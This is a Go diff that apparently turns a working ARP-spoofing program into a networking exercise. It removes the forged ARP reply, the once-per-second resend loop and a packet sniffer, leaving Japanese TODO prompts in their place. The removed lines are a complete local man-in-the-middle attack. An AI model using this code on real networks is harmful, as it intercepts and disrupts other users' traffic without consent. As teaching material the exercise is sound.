@@ -2,14 +2,12 @@ package main
 
 import (
 	"flag"
-	"fmt"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 	"log"
 	"net"
 	"strings"
-	"time"
 )
 
 type nwDevice struct {
@@ -54,17 +52,7 @@ func main() {
 		EthernetType: layers.EthernetTypeARP,
 	}
 	// Todo: ARPスプーフィングをするリプライを作成してください
-	arpreply := &layers.ARP{
-		AddrType:          layers.LinkTypeEthernet,
-		Protocol:          layers.EthernetTypeIPv4,
-		HwAddressSize:     6,
-		ProtAddressSize:   4,
-		Operation:         layers.ARPReply,
-		SourceHwAddress:   netif.macAddr,
-		SourceProtAddress: []byte{192, 168, 1, 3},
-		DstHwAddress:      []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-		DstProtAddress:    []byte{192, 168, 1, 2},
-	}
+	arpreply := &layers.ARP{}
 	packetbuf := gopacket.NewSerializeBuffer()
 	err := gopacket.SerializeLayers(
 		packetbuf,
@@ -82,21 +70,7 @@ func main() {
 	}
 
 	// Todo: ARPリプライを送信し続けてください
-	go func() {
-		for {
-			time.Sleep(1000 * time.Millisecond)
-			handle.WritePacketData(packetbuf.Bytes())
-		}
-	}()
 
 	// Todo: ICMPを受信してください
-	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
-	for packet := range packetSource.Packets() {
-		ethernetLayer := packet.Layer(layers.LayerTypeEthernet)
-		ethernetPacket := ethernetLayer.(*layers.Ethernet)
-		if ethernetPacket.EthernetType.LayerType() == layers.LayerTypeIPv4 {
-			fmt.Printf("packet is %+v\n", packet)
-		}
-	}
 
 }
